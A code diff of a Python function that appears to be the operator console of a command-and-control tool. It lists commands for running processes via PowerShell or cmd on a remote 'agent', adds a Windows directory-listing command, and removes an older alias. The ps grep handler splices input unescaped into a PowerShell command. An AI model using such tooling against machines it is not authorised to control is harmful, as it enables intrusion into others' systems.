@@ -43,6 +43,7 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             print("  psrun <pattern>                   :: Start a new process via Powershell")
             print("  cmdrun <pattern>                  :: Start a new process via cmd")
             print("  kill                              :: Send a signal to terminate the agent")
+            print("  wls <directory_path>              :: List contents of a directory on Windows host")
             print("  exit                              :: Return to main menu\n")
             continue
 
@@ -67,10 +68,7 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                 continue
 
         # Handle specific commands with arguments
-        if command_text.startswith("psls "):
-            args = command_text[5:]
-            command_text = f"powershell ls {args}"
-        elif command_text.startswith('ps grep'):
+        if command_text.startswith('ps grep'):
             try:
                 _, _, pattern = command_text.split(maxsplit=2)
                 command_text = f"powershell -Command \"Get-Process | Where-Object {{$_.ProcessName -like '*{pattern}*'}}\""
@@ -89,7 +87,7 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                 print("Invalid psrun command format. Use 'psrun <path_to_executable_or_file>'")
                 continue
 
-        # cmdrun command (new)
+        # cmdrun command
         if command_text.startswith("cmdrun "):
             try:
                 _, command = command_text.split(maxsplit=1)
@@ -99,6 +97,14 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             except ValueError:
                 print("Invalid cmdrun command format. Use 'cmdrun <path_to_executable_or_file>'")
                 continue
+
+        # Handle the new 'wls' command
+        if command_text.startswith("wls"):
+            parts = command_text.split(maxsplit=1)
+            if len(parts) == 1:
+                command_text = "wls ."  # Default to current directory if no path is provided
+            else:
+                command_text = f"wls {parts[1]}"
 
         # Translate using command mappings
         command_text = command_mappings.get(command_text, command_text)
